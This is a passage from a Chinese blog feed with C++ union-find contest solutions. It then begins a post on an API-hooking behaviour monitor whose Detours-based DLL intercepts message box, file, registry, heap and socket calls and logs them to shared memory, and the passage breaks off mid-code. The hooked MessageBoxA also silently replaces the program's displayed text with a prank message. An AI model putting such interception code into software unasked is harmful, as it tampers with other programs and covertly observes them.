class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dong</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ll x,y,z;</span><br><span class="line">&#125;t[<span class="number">1005</span>];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">xianglian</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span> <span class="comment">//判断两个洞是否联通</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((t[i].x-t[j].x)*(t[i].x-t[j].x)</span><br><span class="line">       +(t[i].y-t[j].y)*(t[i].y-t[j].y)</span><br><span class="line">       +(t[i].z-t[j].z)*(t[i].z-t[j].z)</span><br><span class="line">       &lt;= (<span class="number">4</span>*r*r))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    cin&gt;&gt;T;</span><br><span class="line">    <span class="keyword">while</span>(T--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(t,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(t));</span><br><span class="line">        <span class="built_in">memset</span>(fa,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(fa));</span><br><span class="line">         cin&gt;&gt;n&gt;&gt;h&gt;&gt;r;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=n+<span class="number">1</span>;i++) <span class="comment">// 集合根初始化</span></span><br><span class="line">            fa[i]=i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            cin&gt;&gt;t[i].x&gt;&gt;t[i].y&gt;&gt;t[i].z;</span><br><span class="line">            <span class="keyword">if</span>(t[i].z &lt;= r) <span class="built_in">merge</span>(<span class="number">0</span>,i);</span><br><span class="line">            <span class="keyword">if</span>(h-t[i].z &lt;= r) <span class="built_in">merge</span>(i,n+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">            <span class="keyword">if</span>( i!=j &amp;&amp; <span class="built_in">xianglian</span>(i,j) )    <span class="built_in">merge</span>(i,j);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">find</span>(<span class="number">0</span>)==<span class="built_in">find</span>(n+<span class="number">1</span>) ) cout&lt;&lt;<span class="string">&quot;Yes&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">else</span> cout&lt;&lt;<span class="string">&quot;No&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="村村通与亲戚相同"><a class="markdownIt-Anchor" href="#村村通与亲戚相同"></a> 村村通（与亲戚相同）</h4>
<p>链接：<a href="http://124.71.166.97:5880/contest/22/problem/P0305">oj | 村村通</a></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211117215108.png" alt="村村通" /></p>
<p>这题直接将亲戚的代码进行稍微的修改就可以<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>A</mi><mi>C</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;AC\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>了。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  ll long long</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">1000</span>+<span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> root[N];<span class="comment">//记录父节点，表示是否属于一个块内</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span><span class="comment">//寻找父节点</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root[x]==x) <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">return</span> root[x]=<span class="built_in">find</span>(root[x]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Join</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fx=<span class="built_in">find</span>(x),fy=<span class="built_in">find</span>(y);</span><br><span class="line">    <span class="keyword">if</span>(fx!=fy)</span><br><span class="line">    &#123;</span><br><span class="line">        root[fx]=fy;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    <span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(n!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(root,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(root));</span><br><span class="line">        num=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;root[i]=i;<span class="comment">//初始化父节点为自己</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(m--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a,&amp;b);<span class="comment">//输入边</span></span><br><span class="line">            <span class="built_in">Join</span>(a,b);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//再判断root数组中的根节点个数</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(root[i]==i)</span><br><span class="line">                num++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,num<span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="银河英雄传说"><a class="markdownIt-Anchor" href="#银河英雄传说"></a> 银河英雄传说</h4>
<p>链接：<a href="http://124.71.166.97:5880/contest/22/problem/P0304">oj | 银河英雄传说</a></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211117215257.png" alt="银河英雄传说" /></p>
<p>这一题主要要计算一个两点间的距离问题，不同于上面的题目，这里存在将另一个集合整体移植到一个集合中并且维护顺序，起初我的想法是用父亲指针与孩子指针维护顺序关系，用加权标记维护高度关系，但是属实是较为复杂了，只能过5个点，菜鸟代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  ll long long</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">30000</span>+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> root[N];<span class="comment">//记录根节点，表示是否属于一个块内</span></span><br><span class="line"><span class="keyword">int</span> Rank[N];</span><br><span class="line"><span class="keyword">int</span> father[N];</span><br><span class="line"><span class="keyword">int</span> son[N];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span><span class="comment">//寻找父节点</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root[x]==x) <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">return</span> root[x]=<span class="built_in">find</span>(root[x]);<span class="comment">//路径压缩</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Join</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">find</span>(x)!=<span class="built_in">find</span>(y))<span class="comment">//不在一棵树上进行合并</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> i,j;</span><br><span class="line">        root[x]=<span class="built_in">find</span>(root[y]);<span class="comment">//当前结点根节点变化</span></span><br><span class="line">        i=x;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            i=son[i];</span><br><span class="line">            root[i]=root[x];<span class="comment">//把当前结点的子节点根节点变化</span></span><br><span class="line">        &#125;<span class="keyword">while</span>(son[i]!=i);</span><br><span class="line">        i=x;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            i=father[i];</span><br><span class="line">            root[i]=root[x];<span class="comment">//当前结点的父结点根都设置为根节点</span></span><br><span class="line">            <span class="comment">//被移到尾部的树的级数不变</span></span><br><span class="line">        &#125;<span class="keyword">while</span> (father[i]!=i);<span class="comment">//此时的i为被移植的树的根</span></span><br><span class="line">        <span class="comment">//for(i=x;father[i]!=i;i=father[i]);</span></span><br><span class="line">        <span class="keyword">for</span>(j=son[y];son[j]!=j;j=son[j]);<span class="comment">//此时j为目标树的底部</span></span><br><span class="line">        father[i]=j;</span><br><span class="line">        son[j]=i;<span class="comment">//将两棵树连接</span></span><br><span class="line">        Rank[j]+=Rank[i];</span><br><span class="line">        <span class="keyword">while</span> (father[j]!=j)</span><br><span class="line">        &#123;</span><br><span class="line">            j=father[j];<span class="comment">//万恶之源，坑我这么久。。。。。。</span></span><br><span class="line">            Rank[j]+=Rank[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">30000</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        root[i]=i;</span><br><span class="line">        Rank[i]=<span class="number">1</span>;</span><br><span class="line">        father[i]=i;</span><br><span class="line">        son[i]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="keyword">char</span> op[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;T);</span><br><span class="line">    <span class="keyword">while</span>(T--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s %d %d&quot;</span>,&amp;op,&amp;a,&amp;b);</span><br><span class="line">        <span class="keyword">if</span>(*op==<span class="string">&#x27;M&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//实行合并操作</span></span><br><span class="line">            <span class="built_in">Join</span>(a,b);</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">find</span>(a)==<span class="built_in">find</span>(b))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//在一棵树上输出间隔</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">abs</span>(Rank[a]-Rank[b])<span class="number">-1</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看了下大佬的题解：<a href="https://www.luogu.com.cn/blog/user24518/solution-p1196">题解 P1196 【银河英雄传说】 - XJHRZ 的博客 - 洛谷博客 (luogu.com.cn)</a>，嗯嗯嗯嗯，嗯嗯嗯，人与人之间的差距令人惭愧。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> fa[<span class="number">30001</span>],front[<span class="number">30001</span>],num[<span class="number">30001</span>],x,y,i,j,n,T,ans;</span><br><span class="line"><span class="comment">//fa[i]表示飞船i的祖先</span></span><br><span class="line"><span class="comment">//front[i]表示飞船i与其所在列队头的距离</span></span><br><span class="line"><span class="comment">//num[i]表示第i列的飞船数量</span></span><br><span class="line"><span class="keyword">char</span> ins;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;<span class="comment">//查找祖先的函数</span></span><br><span class="line">    <span class="keyword">if</span>(fa[n]==n)<span class="keyword">return</span> fa[n];</span><br><span class="line">    <span class="keyword">int</span> fn=<span class="built_in">find</span>(fa[n]);<span class="comment">//先递归找到祖先</span></span><br><span class="line">    front[n]+=front[fa[n]];<span class="comment">//在回溯的时候更新front（因为更新时要用到正确的front[祖先]，</span></span><br><span class="line">    <span class="comment">//所以只能在回溯的时候更新）</span></span><br><span class="line">    <span class="keyword">return</span> fa[n]=fn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;T;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">30000</span>;++i)&#123;<span class="comment">//定初值</span></span><br><span class="line">        fa[i]=i;</span><br><span class="line">        front[i]=<span class="number">0</span>;</span><br><span class="line">        num[i]=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(T--)&#123;</span><br><span class="line">        cin&gt;&gt;ins&gt;&gt;x&gt;&gt;y;</span><br><span class="line">        <span class="keyword">int</span> fx=<span class="built_in">find</span>(x);<span class="comment">//fx为x所在列的队头</span></span><br><span class="line">        <span class="keyword">int</span> fy=<span class="built_in">find</span>(y);<span class="comment">//fy同上</span></span><br><span class="line">        <span class="keyword">if</span>(ins==<span class="string">&#x27;M&#x27;</span>)&#123;</span><br><span class="line">            front[fx]+=num[fy];<span class="comment">//更新front[x所在列队头(现在在y所在队列后面)]</span></span><br><span class="line"><span class="comment">//即加上y所在队列的长度</span></span><br><span class="line">            fa[fx]=fy;<span class="comment">//将fy设为fx的祖先</span></span><br><span class="line">            num[fy]+=num[fx];<span class="comment">//更新以fy为队头队列的长度</span></span><br><span class="line">            num[fx]=<span class="number">0</span>; <span class="comment">//以fx为队头的队列已不存在，更新</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(ins==<span class="string">&#x27;C&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(fx!=fy)cout&lt;&lt;<span class="string">&quot;-1&quot;</span>&lt;&lt;endl; <span class="comment">//若x和y的祖先不相同，则不在同一列</span></span><br><span class="line">            <span class="keyword">else</span> cout&lt;&lt;<span class="built_in">abs</span>(front[x]-front[y])<span class="number">-1</span>&lt;&lt;endl;    <span class="comment">//否则利用x和y离队头的距离算</span></span><br><span class="line"><span class="comment">//出它们的距离</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>基于API HOOK的软件行为分析系统</title>
    <url>/2021/11/17/%E5%9F%BA%E4%BA%8EAPI-HOOK%E7%9A%84%E8%BD%AF%E4%BB%B6%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<hr />
<p>操作平台:<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>W</mi><mi>i</mi><mi>n</mi><mtext>  </mtext><mn>10</mn><mtext>  </mtext><mi>X</mi><mn>86</mn></mrow><annotation encoding="application/x-tex">\;Win\;10\;X86</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mord">8</span><span class="mord">6</span></span></span></span></p>
<p>编译软件:<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>V</mi><mi>S</mi><mn>2019</mn><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;VS2019\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord">2</span><span class="mord">0</span><span class="mord">1</span><span class="mord">9</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span></p>
<p>界面设计:<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>Q</mi><mi>t</mi><mtext>  </mtext><mn>5.12</mn><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;Qt\;5.12\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">Q</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">5</span><span class="mord">.</span><span class="mord">1</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span></p>
<hr />
<p>效果预览：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211117225136.png" alt="主界面" /></p>
<p>程序中用到的图标文件可以自行替换。</p>
<hr />
<h3 id="dll编写"><a class="markdownIt-Anchor" href="#dll编写"></a> Dll编写</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;detours.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdarg.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;detours.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MESSAGEBOXA 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MESSAGEBOXW 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CREATEFILE 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WRITEFILE 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> READFILE 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLOSEHANDLE 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAPCREATE 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAPDESTROY 8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAPFREE 9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAPALLOC 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REGCREATEKEYEX 11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REGSETVALUEEX 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REGCLOSEKEY 13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REGOPENKEYEX 14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REGDELETEVALUE 15</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THESOCKET 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BIND 17</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEND 18</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONNECT 19</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RECV 20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COPYFILEA 21</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">SYSTEMTIME st;</span><br><span class="line"></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> type;<span class="comment">//截获API类型</span></span><br><span class="line">    <span class="keyword">int</span> Num;<span class="comment">//参数个数</span></span><br><span class="line">    SYSTEMTIME st;</span><br><span class="line">    <span class="keyword">char</span> Name[<span class="number">10</span>][<span class="number">30</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">char</span> Value[<span class="number">10</span>][<span class="number">70</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"> multiset&lt;HANDLE&gt; heaphandle;</span><br><span class="line">HANDLE hSemaphore = <span class="built_in">OpenSemaphore</span>(EVENT_ALL_ACCESS, FALSE, <span class="string">L&quot;mySemaphore&quot;</span>);</span><br><span class="line">HANDLE hMapFile = <span class="built_in">OpenFileMapping</span>(FILE_MAP_ALL_ACCESS, <span class="literal">NULL</span>, <span class="string">L&quot;ShareMemory&quot;</span>);</span><br><span class="line">LPVOID lpBase = <span class="built_in">MapViewOfFile</span>(hMapFile, FILE_MAP_ALL_ACCESS, <span class="number">0</span>, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(info));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//需要HOOK的函数名</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(WINAPI* OldMessageBoxW)</span><span class="params">(_In_opt_ HWND hwnd, _In_opt_ LPCWSTR lpText, _In_opt_ LPCWSTR lpCaption, _In_ UINT utype)</span> </span>= MessageBoxW;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(WINAPI* OldMessageBoxA)</span><span class="params">(_In_opt_ HWND hwnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT utype)</span> </span>= MessageBoxA;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//替换的函数</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport)<span class="function"><span class="keyword">int</span> WINAPI <span class="title">NewMessageBoxA</span><span class="params">(_In_opt_ HWND hwnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT utype)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    info info1;</span><br><span class="line">    <span class="comment">//向共享内存中写入信息</span></span><br><span class="line">    info1.type = MESSAGEBOXA;</span><br><span class="line">    info1.Num = <span class="number">4</span>;</span><br><span class="line">    <span class="built_in">GetLocalTime</span>(&amp;(info1.st));</span><br><span class="line">    <span class="built_in">sprintf</span>(info1.Name[<span class="number">0</span>], <span class="string">&quot;hwnd&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info1.Name[<span class="number">1</span>], <span class="string">&quot;lpText(窗口文本)&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info1.Name[<span class="number">2</span>], <span class="string">&quot;lpCaption(窗口标题)&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info1.Name[<span class="number">3</span>], <span class="string">&quot;utype&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info1.Value[<span class="number">0</span>], <span class="string">&quot;%08X&quot;</span>, hwnd);</span><br><span class="line">    <span class="built_in">sprintf</span>(info1.Value[<span class="number">1</span>], <span class="string">&quot;%s&quot;</span>, lpText);</span><br><span class="line">    <span class="built_in">sprintf</span>(info1.Value[<span class="number">2</span>], <span class="string">&quot;%s&quot;</span>, lpCaption);</span><br><span class="line">    <span class="built_in">sprintf</span>(info1.Value[<span class="number">3</span>], <span class="string">&quot;%08X&quot;</span>, utype);</span><br><span class="line">    <span class="built_in">memcpy</span>(lpBase, &amp;info1, <span class="built_in"><span class="keyword">sizeof</span></span>(info));</span><br><span class="line">    <span class="comment">//V操作，信号量加一</span></span><br><span class="line">    <span class="built_in">ReleaseSemaphore</span>(hSemaphore, <span class="number">1</span>, <span class="literal">NULL</span>); </span><br><span class="line">    info1.Num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">OldMessageBoxA</span>(<span class="literal">NULL</span>,<span class="string">&quot;嘿，没想到吧！FBI！！open the door！&quot;</span>,<span class="string">&quot;已批准逮捕&quot;</span>,MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport)<span class="function"><span class="keyword">int</span> WINAPI <span class="title">NewMessageBoxW</span><span class="params">(_In_opt_ HWND hwnd, _In_opt_ LPCWSTR lpText, _In_opt_ LPCWSTR lpCaption, _In_ UINT utype)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    info info2;</span><br><span class="line">    info2.Num = <span class="number">4</span>;</span><br><span class="line">    info2.type = MESSAGEBOXW;</span><br><span class="line">    <span class="built_in">GetLocalTime</span>(&amp;(info2.st));</span><br><span class="line">    <span class="built_in">sprintf</span>(info2.Name[<span class="number">0</span>], <span class="string">&quot;hwnd&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info2.Name[<span class="number">1</span>], <span class="string">&quot;lpText(窗口内容)&quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(info2.Name[<span class="number">2</span>], <span 